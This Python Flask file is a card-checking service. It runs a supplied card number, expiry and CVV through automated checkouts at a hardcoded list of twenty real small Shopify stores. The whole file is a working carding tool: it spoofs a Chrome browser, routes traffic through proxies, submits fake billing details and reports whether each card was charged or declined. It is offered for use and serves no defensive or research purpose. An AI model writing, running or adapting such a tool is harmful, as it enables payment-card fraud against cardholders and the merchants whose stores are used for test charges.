import os
import random
import re
import html
import string
import uuid
import time
from flask import Flask, request, jsonify
from curl_cffi import requests

app = Flask(__name__)

# ==========================================
# 🏪 YOUR STORES (HARDCODED)
# ==========================================
STORES = [
    {
        "shop_url": "https://klubfiller.myshopify.com",
        "variant_id": "49321449652532",
        "product_url": "https://klubfiller.myshopify.com/products/klubfiller-waiting-for-tonight"
    },
    {
        "shop_url": "https://thats-what-che-said.myshopify.com",
        "variant_id": "39849766846546",
        "product_url": "https://thats-what-che-said.myshopify.com/products/coffee-before-wordle"
    },
    {
        "shop_url": "https://the-brush-lettering-club.myshopify.com",
        "variant_id": "58864569811325",
        "product_url": "https://the-brush-lettering-club.myshopify.com/products/love-brush-lettering-practice-sheet"
    },
    {
        "shop_url": "https://loveathomeeducation.myshopify.com",
        "variant_id": "49260930990270",
        "product_url": "https://loveathomeeducation.myshopify.com/products/ms-frizzle-earth-science-addition-8-units-pre-sale"
    },
    {
        "shop_url": "https://the-coloring-project.myshopify.com",
        "variant_id": "51956110360864",
        "product_url": "https://the-coloring-project.myshopify.com/products/beautiful-noise-inspired-single-coloring-page-i-am-i-said"
    },
    {
        "shop_url": "https://leemo-designs.myshopify.com",
        "variant_id": "39969683538014",
        "product_url": "https://leemo-designs.myshopify.com/products/digital-download-printable-daily-planner"
    },
    {
        "shop_url": "https://math-giraffe-shop.myshopify.com",
        "variant_id": "43428300390612",
        "product_url": "https://math-giraffe-shop.myshopify.com/products/inductive-vs-deductive-reasoning-doodle-notes"
    },
    {
        "shop_url": "https://swirly-shop-6926.myshopify.com",
        "variant_id": "53010324652341",
        "product_url": "https://swirly-shop-6926.myshopify.com/products/pomegranate-seed"
    },
    {
        "shop_url": "https://ks-original-shop.myshopify.com",
        "variant_id": "55776436093309",
        "product_url": "https://ks-original-shop.myshopify.com/products/lanyard-umhaengeband-mit-karabinerhaken-in-weiss"
    },
    {
        "shop_url": "https://trebuchet-magazine.myshopify.com",
        "variant_id": "39682457206850",
        "product_url": "https://trebuchet-magazine.myshopify.com/products/trebuchet-10-materials-ii-download"
    },
    {
        "shop_url": "https://lamaisontricotee.myshopify.com",
        "variant_id": "41101335920743",
        "product_url": "https://lamaisontricotee.myshopify.com/products/les-mitaines-carol"
    },
    {
        "shop_url": "https://customfavorzbysharon.myshopify.com",
        "variant_id": "45793769423018",
        "product_url": "https://customfavorzbysharon.myshopify.com/products/kids-juneteenth-shirt-png-1865-juneteenth-png-black-history-instant-download"
    },
    {
        "shop_url": "https://tjnicholsbooks.myshopify.com",
        "variant_id": "50151793656109",
        "product_url": "https://tjnicholsbooks.myshopify.com/products/minotaurs-and-other-magic-mytho-collapse-ebook"
    },
    {
        "shop_url": "https://lawn-chair.myshopify.com",
        "variant_id": "37472988135583",
        "product_url": "https://lawn-chair.myshopify.com/products/footlights-1"
    },
    {
        "shop_url": "https://kingsleylockwoodliterarybooks.myshopify.com",
        "variant_id": "51750254805299",
        "product_url": "https://kingsleylockwoodliterarybooks.myshopify.com/products/love-finds-the-way-ebook"
    },
    {
        "shop_url": "https://triplecrownjewelry.myshopify.com",
        "variant_id": "39656687403113",
        "product_url": "https://triplecrownjewelry.myshopify.com/products/__customized-items"
    },
    {
        "shop_url": "https://marklindsaymemorabilia.myshopify.com",
        "variant_id": "45847518019832",
        "product_url": "https://marklindsaymemorabilia.myshopify.com/products/blue-star"
    },
    {
        "shop_url": "https://trinity-valley-school.myshopify.com",
        "variant_id": "12175879176300",
        "product_url": "https://trinity-valley-school.myshopify.com/products/concessions-2"
    },
    {
        "shop_url": "https://dante-mazzetti-shop.myshopify.com",
        "variant_id": "40837271257220",
        "product_url": "https://dante-mazzetti-shop.myshopify.com/products/out-of-my-mind-digital-single"
    },
    {
        "shop_url": "https://mama-lisas-world.myshopify.com",
        "variant_id": "31890270650422",
        "product_url": "https://mama-lisas-world.myshopify.com/products/how-to-dye-eggs-naturally-easy-print-pack"
    }
]

# ==========================================
# 🛠️ HELPERS
# ==========================================
def parse_card(card_str):
    parts = card_str.split("|")
    if len(parts) >= 4:
        ccn  = parts[0].strip().replace(" ","")
        mm   = parts[1].strip()
        yy   = parts[2].strip()
        cvv  = parts[3].strip()
        yyyy = "20" + yy if len(yy) == 2 else yy
        return ccn, mm, yyyy, cvv
    return None

def parse_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    for scheme in ["socks5://","socks5h://","http://","https://"]:
        if proxy_str.startswith(scheme):
            proxy_str = proxy_str[len(scheme):]
            break
    parts = proxy_str.split(":")
    if len(parts) >= 4:
        return f"socks5h://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return f"socks5h://{proxy_str}"

def extract_session_token(html_text):
    patterns = [r'name="serialized-sessionToken"\s+content="([^"]+)"', r'"sessionToken"\s*:\s*"([^"]+)"']
    for pat in patterns:
        m = re.search(pat, html_text)
        if m: return m.group(1).replace("&quot;", "").strip('"\'')
    return None

def random_attempt_suffix(length=12):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# ==========================================
# 🛒 FULL CHECKOUT LOGIC
# ==========================================
def process_checkout(card_data, proxy_url, store):
    ccn, mm, yyyy, cvv = card_data
    SHOP_URL = store["shop_url"]
    VARIANT_ID = store["variant_id"]
    PRODUCT_URL = store["product_url"]

    browser_profile = "chrome124"
    session = requests.Session(impersonate=browser_profile)
    session.proxies = {"http": proxy_url, "https": proxy_url}
    current_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

    try:
        # 1. ADD TO CART
        r = session.post(
            f"{SHOP_URL}/cart/add.js",
            headers={"content-type": "application/json", "origin": SHOP_URL, "referer": PRODUCT_URL, "user-agent": current_ua},
            json={"id": int(VARIANT_ID), "quantity": 1},
            timeout=25,
        )
        if r.status_code != 200:
            return {"Response": f"CART_FAILED_{r.status_code}", "success": False}

        # 2. TRIGGER CHECKOUT
        r = session.post(
            f"{SHOP_URL}/cart",
            headers={"content-type": "application/x-www-form-urlencoded", "origin": SHOP_URL, "referer": PRODUCT_URL, "user-agent": current_ua},
            data="checkout=",
            allow_redirects=False,
            timeout=25,
        )
        if r.status_code not in [301, 302, 303, 307, 308]:
            return {"Response": f"CHECKOUT_FAILED_{r.status_code}", "success": False}

        redirect_url = r.headers.get("Location")
        match = re.search(r"/cn/([^/]+)/", redirect_url)
        if not match:
            return {"Response": "NO_CART_TOKEN", "success": False}
        cart_token = match.group(1)

        real_checkout_url = f"{SHOP_URL}/checkouts/cn/{cart_token}/en-us?skip_shop_pay=true"

        # 3. GET CHECKOUT PAGE
        r = session.get(real_checkout_url, headers={"user-agent": current_ua}, timeout=25)
        clean_text = html.unescape(r.text)

        build_id_match = re.search(r'"commitSha"\s*:\s*"([0-9a-f]{40})"', clean_text)
        build_id = build_id_match.group(1) if build_id_match else ""

        x_checkout_one_session_token = extract_session_token(r.text)
        if not x_checkout_one_session_token:
            return {"Response": "MISSING_SESSION_TOKEN", "success": False}

        queue_token_match = re.search(r'"queueToken"\s*:\s*"([^"]+)"', clean_text)
        queue_token = queue_token_match.group(1) if queue_token_match else ""

        stable_id_match = re.search(r'"stableId"\s*:\s*"([0-9a-f-]{36})"', clean_text)
        stable_id = stable_id_match.group(1) if stable_id_match else None

        total_match = re.search(r'"runningTotal"\s*:\s*\{"value"\s*:\s*\{"amount"\s*:\s*"([\d.]+)"\s*,\s*"currencyCode"\s*:\s*"([A-Z]{3})"', clean_text)
        if total_match:
            current_amount, currency_code = total_match.group(1), total_match.group(2)
        else:
            current_amount, currency_code = "2.50", "USD"

        if not stable_id:
            return {"Response": "MISSING_STABLE_ID", "success": False}

        # 4. PROPOSAL
        proposal_payload = {
            "variables": {
                "sessionInput": {"sessionToken": x_checkout_one_session_token},
                "queueToken": queue_token,
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "delivery": {
                    "deliveryLines": [{
                        "selectedDeliveryStrategy": {"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, "options": {}},
                        "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                        "deliveryMethodTypes": ["NONE"], "expectedTotalPrice": {"any": True}, "destinationChanged": True
                    }],
                    "noDeliveryRequired": [], "useProgressiveRates": False, "supportsSplitShipping": True
                },
                "deliveryExpectations": {"deliveryExpectationLines": []},
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": stable_id,
                        "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{VARIANT_ID}", "variantId": f"gid://shopify/ProductVariant/{VARIANT_ID}", "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"value": {"amount": str(current_amount), "currencyCode": currency_code}},
                        "lineComponentsSource": None, "lineComponents": []
                    }]
                },
                "memberships": {"memberships": []},
                "payment": {
                    "totalAmount": {"any": True}, "paymentLines": [],
                    "billingAddress": {"streetAddress": {"address1": "123 Main St", "city": "New York", "countryCode": "US", "postalCode": "10001", "firstName": "Test", "lastName": "User", "zoneCode": "NY", "phone": ""}},
                    "creditCardBin": ccn[:8], "allowStoreCredit": False
                },
                "buyerIdentity": {
                    "customer": {"presentmentCurrency": currency_code, "countryCode": "US"},
                    "email": "test@example.com", "emailChanged": True, "phoneCountryCode": "US",
                    "marketingConsent": [{"email": {"consentState": "DECLINED", "value": "test@example.com"}}],
                    "shopPayOptInPhone": {"number": "", "countryCode": "US"}, "rememberMe": False
                },
                "tip": {"tipLines": []},
                "taxes": {"proposedAllocations": None, "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency_code}}, "proposedTotalIncludedAmount": None, "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
                "note": {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []},
                "nonNegotiableTerms": None,
                "scriptFingerprint": {"signature": None, "signatureUuid": None, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []},
                "optionalDuties": {"buyerRefusesDuties": False},
                "cartMetafields": [], "includeBuyerProposalDelivery": False, "includeBuyerProposalCartMetafields": False,
            },
            "operationName": "Proposal",
            "id": "6d9f0eb3d750c837c721c99da1ec1c7f1ce832d3687c5d0d0ffc1b42a610d3e8",
        }
        
        r = session.post(
            f"{SHOP_URL}/checkouts/internal/graphql/persisted?operationName=Proposal",
            headers={"content-type": "application/json", "origin": SHOP_URL, "referer": real_checkout_url, "user-agent": current_ua, "x-checkout-one-session-token": x_checkout_one_session_token, "x-checkout-web-build-id": build_id},
            json=proposal_payload, timeout=25
        )
        proposal_json = r.json()
        
        # Extract tokens from proposal
        x_checkout_one_session_token = r.headers.get("x-checkout-one-session-token", x_checkout_one_session_token)
        
        negotiate = proposal_json.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {})
        queue_token = negotiate.get("queueToken", queue_token)
        seller = negotiate.get("sellerProposal", {})
        
        pm_match = re.search(r'"paymentMethodIdentifier":"([^"]+)"', r.text)
        payment_method_id = pm_match.group(1) if pm_match else None
        
        if not payment_method_id:
            return {"Response": "NO_PAYMENT_METHOD", "success": False}

        # 5. PCI SESSION
        pci_data = {
            "credit_card": {"number": ccn, "month": int(mm), "year": int(yyyy), "verification_value": cvv, "name": "Test User"},
            "payment_session_scope": SHOP_URL.split("//")[1],
        }
        r = session.post("https://checkout.pci.shopifyinc.com/sessions", headers={"content-type": "application/json", "origin": "https://checkout.pci.shopifyinc.com", "user-agent": current_ua}, json=pci_data, timeout=25)
        pci_json = r.json()
        session_id = pci_json.get("id")
        if not session_id:
            return {"Response": "NO_PCI_SESSION", "success": False}

        # 6. SUBMIT
        final_total = current_amount
        current_tax = "0"
        try:
            new_amount = seller.get("payment", {}).get("totalAmount", {}).get("value", {}).get("amount")
            if new_amount: final_total = new_amount
            new_tax = seller.get("taxes", {}).get("proposedTotalAmount", {}).get("value", {}).get("amount")
            if new_tax: current_tax = new_tax
        except: pass

        submit_payload = {
            "variables": {
                "input": {
                    "sessionInput": {"sessionToken": x_checkout_one_session_token},
                    "queueToken": queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "selectedDeliveryStrategy": {"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, "options": {}},
                            "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                            "deliveryMethodTypes": ["NONE"], "expectedTotalPrice": {"any": True}, "destinationChanged": True
                        }],
                        "noDeliveryRequired": [], "useProgressiveRates": False, "supportsSplitShipping": True
                    },
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id,
                            "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{VARIANT_ID}", "variantId": f"gid://shopify/ProductVariant/{VARIANT_ID}", "properties": []}},
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"value": {"amount": str(final_total), "currencyCode": currency_code}}
                        }]
                    },
                    "memberships": {"memberships": []},
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": payment_method_id, "sessionId": session_id,
                                    "billingAddress": {"streetAddress": {"address1": "123 Main St", "city": "New York", "countryCode": "US", "postalCode": "10001", "firstName": "Test", "lastName": "User", "zoneCode": "NY", "phone": ""}},
                                    "cardSource": None
                                }
                            },
                            "amount": {"value": {"amount": str(final_total), "currencyCode": currency_code}}
                        }],
                        "billingAddress": {"streetAddress": {"address1": "123 Main St", "city": "New York", "countryCode": "US", "postalCode": "10001", "firstName": "Test", "lastName": "User", "zoneCode": "NY", "phone": ""}},
                        "creditCardBin": ccn[:8], "allowStoreCredit": False
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency_code, "countryCode": "US"},
                        "email": "test@example.com", "emailChanged": True, "phoneCountryCode": "US",
                        "marketingConsent": [{"email": {"consentState": "DECLINED", "value": "test@example.com"}}],
                        "shopPayOptInPhone": {"number": "", "countryCode": "US"}, "rememberMe": False
                    },
                    "tip": {"tipLines": []},
                    "taxes": {"proposedTotalAmount": {"value": {"amount": str(current_tax), "currencyCode": currency_code}}}
                },
                "attemptToken": f"{cart_token}-{random_attempt_suffix()}",
                "metafields": [],
                "analytics": {"requestUrl": real_checkout_url, "pageId": str(uuid.uuid4())}
            },
            "operationName": "SubmitForCompletion",
            "id": "b3fd8db496438a6859c96db264b77e84b3f093d11a44c4d0a84d43e661f12419"
        }

        r = session.post(
            f"{SHOP_URL}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
            headers={"content-type": "application/json", "origin": SHOP_URL, "referer": real_checkout_url, "user-agent": current_ua, "x-checkout-one-session-token": x_checkout_one_session_token, "x-checkout-web-build-id": build_id},
            json=submit_payload, timeout=25
        )
        
        # 7. PARSE RESULT
        sfc = r.json().get("data", {}).get("submitForCompletion", {})
        receipt = sfc.get("receipt", {})
        
        if receipt.get("__typename") == "FailedReceipt":
            err_code = receipt.get("processingError", {}).get("code", "CARD_DECLINED")
            return {"Response": err_code, "Price": f"{current_amount} {currency_code}", "Gate": "Shopify Payments", "success": False}
        elif receipt.get("__typename") in ("ProcessedReceipt", "ProcessingReceipt"):
            return {"Response": "ORDER_PLACED", "Charged": "True", "Approved": "True", "Price": f"{current_amount} {currency_code}", "Gate": "Shopify Payments", "success": True}

        return {"Response": "UNKNOWN_RESPONSE", "success": False}

    except Exception as e:
        return {"Response": f"ERROR_{str(e)[:20]}", "success": False}


# ==========================================
# 🌐 API ROUTES
# ==========================================
@app.route("/")
def check_card():
    card_str = request.args.get("card")
    proxy_str = request.args.get("proxy", "")

    if not card_str or not proxy_str:
        return jsonify({"Response": "MISSING_PARAMS", "success": False})

    card_data = parse_card(card_str)
    if not card_data:
        return jsonify({"Response": "INVALID_CARD", "success": False})

    # Pick a random product from the STORES list
    store = random.choice(STORES)
    proxy_url = parse_proxy(proxy_str)

    result = process_checkout(card_data, proxy_url, store)
    return jsonify(result)

@app.route("/health")
def health():
    return jsonify({"workers_busy": 0, "workers_cap": 1000, "sites": len(STORES)})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))